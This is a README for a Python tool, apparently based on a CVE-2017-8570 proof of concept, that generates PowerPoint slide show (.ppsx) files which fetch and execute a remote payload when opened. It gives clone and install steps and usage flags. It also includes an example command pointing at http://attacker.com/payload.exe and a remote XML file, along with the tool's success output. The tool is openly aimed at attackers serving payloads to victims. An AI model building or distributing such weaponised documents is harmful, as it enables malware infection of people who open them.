# Introduction
By Temesgen Yibeltal temu1yibeltal@gmail.com (Based on code by https://github.com/bhdresh/CVE-2017-8570 (now removed))

ppsx-file-generator is a python tool that generates a power point slide show file that executes code from a remote source based on an existing file.

# What does it do?

The tool generates a power point slide show file and an xml file based using the input provided. The power point file accesses the xml file which holds information of the payload file. An attacker could serve the xml file and the payload on a local or public server and provide the url for each as input.

# Getting the code

First, get the code:
```
git clone https://github.com/temesgeny/ppsx-file-generator.git
```

ppsx-file-generator is written in Python and requires zipfile which can be installed using Pip:
```
pip install zipfile
```
Requires Microsoft Office Power Point to  carry out this task.

# Usage
First open Microsoft Office Power Point and open 'template.ppsx'. Open your own presentation file and copy the icon 'Coder.exe' from template.ppsx to slide 1 of your power point file. Save the file as Power Point Show (.ppsx). Then use the python tool as

        Usage: generate_ppsx.py input_filename -o output_filename -p payload_uri -x xml_uri

        input_filename          The input ppsx file name.

        -o              Output .ppsx file name, (inlcude the .ppsx).
        -p              The payload exe or sct file url. 
                        It must be in an accessible web server. (Optional for xml file)
        -x              The full xml uri to be called by the ppsx file. 
                        It must be in an accessible web server.(Required)

```
python generate_ppsx.py -o output.ppsx -p http://attacker.com/payload.exe -x http://attacker.com/content.xml input.ppsx
Generated content.xml successfully
Generated output.ppsx successfully
```
